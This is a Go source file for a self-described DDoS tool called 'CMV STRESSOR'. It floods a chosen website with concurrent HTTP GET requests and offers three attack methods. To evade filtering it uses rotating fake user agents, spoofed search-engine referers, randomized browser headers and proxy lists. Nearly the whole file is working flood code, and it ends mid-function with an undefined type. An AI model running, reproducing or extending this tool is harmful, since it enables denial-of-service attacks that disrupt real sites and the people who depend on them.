package main

import (
    "bufio"
    "flag"
    "fmt"
    "io/ioutil"
    "log"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "strconv"
    "strings"
    "sync/atomic"
    "syscall"
    "encoding/json"
    "time"
)

const __version__ = "1.1"

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
    callGotOk              uint8 = iota
    callExitOnErr
    callExitOnTooManyFiles
    targetComplete
)


type LogEntry struct {
    Timestamp  string `json:"timestamp"`
    URL        string `json:"url"`
    UserAgent  string `json:"user_agent"`
    StatusCode int    `json:"status_code"`
    Retries    int    `json:"retries"`
    Error      string `json:"error,omitempty"`
}


var requestLogger *log.Logger 

const (
    Reset  = "\033[0m"
    Red    = "\033[31m"
    Blue   = "\033[34m"
    Green  = "\033[32m"
    Cyan   = "\033[36m"
    Yellow = "\033[33m"
)

var (
    safe            bool
    headersReferers []string = []string{
        "http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://bing.com/?q=",
        "https://search.yahoo.com/search?p=",
        "https://duckduckgo.com/?q=",
        "https://yandex.com/search/?text=",
        "https://www.ecosia.org/search?q=",
        "https://www.ask.com/web?q=",
        "https://www.baidu.com/s?wd=",
        "https://www.startpage.com/do/search?q=",
        "https://www.qwant.com/?q=",
        "https://www.wikipedia.org/wiki/",
        "https://www.youtube.com/results?search_query=",
        "https://www.amazon.com/s?k=",
        "https://www.ebay.com/sch/i.html?_nkw=",
        "https://www.reddit.com/search/?q=",
        "https://www.imdb.com/find?q=",
        "https://scholar.google.com/scholar?q=",
        "https://www.nytimes.com/search?query=",
        "https://www.theguardian.com/us/search?q=",
        "https://www.cnn.com/search?q=",
        "https://www.bbc.co.uk/search?q=",
        "https://www.aliexpress.com/wholesale?SearchText=",
        "https://www.flipkart.com/search?q=",
        "https://medium.com/search?q=",
        "https://soundcloud.com/search?q=",
        "https://vimeo.com/search?q=",
        "https://www.ted.com/search?q=",
        "https://www.goodreads.com/search?q=",
        "https://www.apple.com/search/",
        "https://play.google.com/store/search?q=",
        "https://open.spotify.com/search/",
    }
    headersUseragents []string
    cur              int32
    proxies          []string
)

func init() {
    headersUseragents = []string{
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
        "Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120",
        "Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
        "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
        "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
        "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.141 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Android 10; Mobile; rv:85.0) Gecko/85.0 Firefox/85.0",
        "Mozilla/5.0 (Linux; Android 10; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36 Edge/15.15063",
        "Mozilla/5.0 (Linux; Android 11; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.0.0; SM-T590) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.0.0; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-J510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-G530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.0.0; SM-T813) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-J330F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.0.0; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Mobile Safari/537.36",
       
        

    }

        timestamp := time.Now().Format("2006-01-02_15-04-05")
    logFileName := fmt.Sprintf("requests-%s.log", timestamp)

    // improved logger
    logFile, err := os.OpenFile(logFileName, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    if err != nil {
        fmt.Println("Error opening log file:", err)
        os.Exit(1)
    }

    requestLogger = log.New(logFile, "", log.LstdFlags)
    fmt.Println(Green + "Logging started. Writing to: " + logFileName + Reset)

  
}




func getRandomUserAgent() string {
    return headersUseragents[rand.Intn(len(headersUseragents))]
}

func rateLimit(interval time.Duration) {
    time.Sleep(interval)
}

func main() {
    var (
        version bool
        site    string
        agents  string
        data    string
        proxy   string
        headers arrayFlags
        heta     bool
        hetb     bool
    )
    

    flag.BoolVar(&version, "version", false," CMV STRESSOR Made by NaughtyBheem and blazingsky24 :D version 1.0")
    flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
    flag.StringVar(&site, "site", "http://localhost", "Destination site.")
    flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
    flag.StringVar(&data, "data", "", "Data to POST. If present, Sch1.2 will use POST requests instead of GET")
    flag.StringVar(&proxy, "proxy", "", "File with list of proxy servers to use.")
    flag.Var(&headers, "header", "Add headers to the request. Can be used multiple times")
    flag.BoolVar(&heta, "heta", false, "Main method DDos")
    flag.BoolVar(&hetb, "hetb", false, "Hard Coded Ddos")

    flag.Parse()
    if flag.NFlag() == 0 {
        sendusage()
        return
    }

    t := os.Getenv("SCH1MAXPROCS")
    maxproc, err := strconv.Atoi(t)
    if err != nil {
        maxproc = 1023
    }

    u, err := url.Parse(site)
    if err != nil {
        fmt.Println(Red+"Error parsing URL parameter"+ Reset)
        os.Exit(1)
    }

    if version {
        fmt.Println(Red+"CMV STRESSOR v1.0", __version__ + Reset)
        os.Exit(0)
    }

    if agents != "" {
        if data, err := ioutil.ReadFile(agents); err == nil {
            headersUseragents = []string{}
            for _, a := range strings.Split(string(data), "\n") {
                if strings.TrimSpace(a) == "" {
                    continue
                }
                headersUseragents = append(headersUseragents, a)
            }
        } else {
            fmt.Printf(Red+"Can't load User-Agent list from %s\n", agents + Reset)
            os.Exit(1)
        }
    }

    if proxy != "" {
        file, err := os.Open(proxy)
        if err != nil {
            fmt.Println("Error opening proxy file:", err ) 
            os.Exit(1)
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            proxies = append(proxies, scanner.Text())
        }

        if err := scanner.Err(); err != nil {
            fmt.Println( "Error reading proxy file:", err)
            os.Exit(1)
        }
    }

    go func() {
        fmt.Println("")
        fmt.Println(Blue+"-- CMV STRESSOR Attack Started --\n     Go!\n\n"+ Reset)
        fmt.Println("")
        ss := make(chan uint8, 8)
        var (
            err, sent int32
        )
        fmt.Println(Red+ "In use               |\tResp OK |\tGot err     "+ Reset)
        
        for {
            if atomic.LoadInt32(&cur) < int32(maxproc-1) {
                if heta {
                    go heta1(site, u.Host, data, headers, ss)
                } else if hetb {
                    go hetb1(site, u.Host, data, headers, ss)
                } else {
                    go httpcall(site, u.Host, data, headers, ss)
                }
            }
            if sent%10 == 0 {
                fmt.Printf(Red+"\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err,  Reset)
                
            }
            switch <-ss {
            case callExitOnErr:
                atomic.AddInt32(&cur, -1)
                err++
            case callExitOnTooManyFiles:
                atomic.AddInt32(&cur, -1)
                maxproc--
            case callGotOk:
                sent++
            case targetComplete:
                sent++
                fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
                fmt.Println("\r-- Sch1.2 Attack Finished --       \n\n\r")
                os.Exit(0)
            }
        }
    }()

    ctlc := make(chan os.Signal)
    signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
    <-ctlc
    fmt.Println(Green +"\r\n-- Interrupted by user --        \n" + Reset)
}

func setRandomHeaders(q *http.Request) {
   
    permanentHeaders := map[string]string{
        "Connection":                "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Pragma":                    "no-cache",
    }

    
    variableHeaders := map[string][]string{
        "Cache-Control":       {"no-cache", "max-age=0", "no-store", "private"},
        "Accept-Encoding":     {"gzip, deflate", "gzip, deflate, br"},
        "DNT":                 {"0", "1"},
        "Accept-Language":     {"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"},
        "Sec-Fetch-Dest":      {"document", "iframe", "empty"},
        "Sec-Fetch-Mode":      {"navigate", "cors", "no-cors"},
        "Sec-Fetch-Site":      {"none", "cross-site", "same-origin"},
    }

   
    for key, value := range permanentHeaders {
        q.Header.Set(key, value)
    }

    
    for key, values := range variableHeaders {
        q.Header.Set(key, values[rand.Intn(len(values))])
    }
}


func getRandomProxy(proxies []string) string {
    if len(proxies) > 0 {
        return proxies[rand.Intn(len(proxies))]
    }
    return "" 
}


func logRequestDetails(url string, userAgent string, statusCode int, retries int, err error) {
    logEntry := LogEntry{
        Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
        URL:        url,
        UserAgent:  userAgent,
        StatusCode: statusCode,
        Retries:    retries,
    }

   
    if err != nil {
        logEntry.Error = err.Error()
    }

    
    logJSON, _ := json.Marshal(logEntry)


    requestLogger.Println(string(logJSON))
}


func httpcall(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
    atomic.AddInt32(&cur, 1)

    for {
        q, err := http.NewRequest("GET", requestURL, nil)
        if err != nil {
            logRequestDetails(requestURL, getRandomUserAgent(), 0, 0, err)
            s <- callExitOnErr
            return
        }

        q.Header.Set("User-Agent", getRandomUserAgent())
        q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])

        for _, v := range headers {
            kv := strings.Split(v, ":")
            if len(kv) < 2 {
                continue
            }
            k := strings.TrimSpace(kv[0])
            v := strings.TrimSpace(kv[1])
            q.Header.Set(k, v)
        }

        for retries := 0; retries < 5; retries++ {
            resp, err := http.DefaultClient.Do(q)
            if err != nil {
                logRequestDetails(requestURL, getRandomUserAgent(), 0, retries, err)
                time.Sleep(time.Duration(1<<retries) * time.Millisecond)
                continue
            }
            defer resp.Body.Close()

            logRequestDetails(requestURL, getRandomUserAgent(), resp.StatusCode, 0, err)

            if resp.StatusCode >= 200 && resp.StatusCode < 300 {
                s <- callGotOk
            } else {
                s <- callExitOnErr
            }
            return
        }
    }
}

func heta1(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
    atomic.AddInt32(&cur, 1)

    for {
        time.Sleep(10 * time.Millisecond)
       
        proxyURL := getRandomProxy(proxies) 
        transport := &http.Transport{}

        if proxyURL != "" {
            parsedProxy, err := url.Parse(proxyURL)
            if err == nil {
                transport.Proxy = http.ProxyURL(parsedProxy)
            }
        }

        client := &http.Client{Transport: transport}

        q, err := http.NewRequest("GET", requestURL, nil)
        if err != nil {
            s <- callExitOnErr
            return
        }

        q.Header.Set("User-Agent", getRandomUserAgent())

       
        setRandomHeaders(q)

        
        for _, v := range headers {
            kv := strings.Split(v, ":")
            if len(kv) < 2 {
                continue
            }
            k := strings.TrimSpace(kv[0])
            v := strings.TrimSpace(kv[1])
            q.Header.Set(k, v)
        }

        resp, err := client.Do(q)
        if err != nil {
            s <- callExitOnErr
            return
        }
        defer resp.Body.Close()

        logRequestDetails(requestURL, getRandomUserAgent(), resp.StatusCode, 0, err)

        if resp.StatusCode >= 200 && resp.StatusCode < 300 {
            s <- callGotOk
        } else {
            s <- callExitOnErr
        }
    }
}


func hetb1(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
    atomic.AddInt32(&cur, 1)

    for {
        
        time.Sleep(10 * time.Millisecond) 
        
        q, err := http.NewRequest("GET", requestURL, nil)
        if err != nil {
            s <- callExitOnErr
            return
        }

        q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
        q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]);
        q.Header.Set("Cache-Control", "no-cache")
        q.Header.Set("Accept-Encoding", "gzip, deflate")
        q.Header.Set("Pragma", "no-cache")
        q.Header.Set("DNT", "1")
        q.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        q.Header.Set("Accept-Encoding", "gzip, deflate, sdch")
        q.Header.Set("Connection",      "keep-alive" )
        q.Header.Set("Upgrade-Insecure-Requests", "1" )
        q.Header.Set("Sec-Fetch-Dest",  "document")
        q.Header.Set("Sec-Fetch-Mode",  "navigate")
        q.Header.Set("Sec-Fetch-Site",  "none")
        q.Header.Set("Sec-Fetch-User",  "?1")

        for _, v := range headers {
            kv := strings.Split(v, ":")
            if len(kv) < 2 {
                continue
            }
            k := strings.TrimSpace(kv[0])
            v := strings.TrimSpace(kv[1])
            q.Header.Set(k, v)
        }

        resp, err := http.DefaultClient.Do(q)
        if err != nil {
            s <- callExitOnErr
            return
        }
        defer resp.Body.Close()

        logRequestDetails(requestURL, getRandomUserAgent(), resp.StatusCode, 0, err)

        if resp.StatusCode >= 200 && resp.StatusCode < 300 {
            s <- callGotOk
        } else {
            s <- callExitOnErr
        }
    }
}

func sendusage() {
    fmt.Println("")
    fmt.Println(Blue + " CMV STRESSOR BY NaughtyBheem and blazingsky24" + Reset)
    fmt.Println("")
    fmt.Println(Blue + "https://github.com/BheemKiGoli" + Reset)
    fmt.Println("")
    fmt.Println("")
    fmt.Println(Yellow + "./schv1 -site <Destination site.> -safe <shutdown after Dos> -proxy <proxies.txt> -<methodname>  "+ Reset)
    fmt.Println("")
    fmt.Println(Green + "Methods:" + Reset)
    fmt.Println("")
    fmt.Println(Green + "1) " + Cyan + "heta"+ Red +"(Main DDos With random flags and  http proxy)" + Reset)
    fmt.Println(Green + "2) " + Cyan + "hetb"+ Red +"(Another Method with Hardcoded flags and no proxy )" + Reset)
    fmt.Println(Green + "3) " + Cyan + "without flag (http call) " + Red + "(the default Method if u run without flags)" + Reset)
    fmt.Println("")
    return
}

func handleInterrupt() {
    ctlc := make(chan os.Signal)
    signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
    <-ctlc
    fmt.Println("")
    fmt.Println(Blue+"\r\n-- Interrupted by user --        \n"+ Reset)
    fmt.Println("")
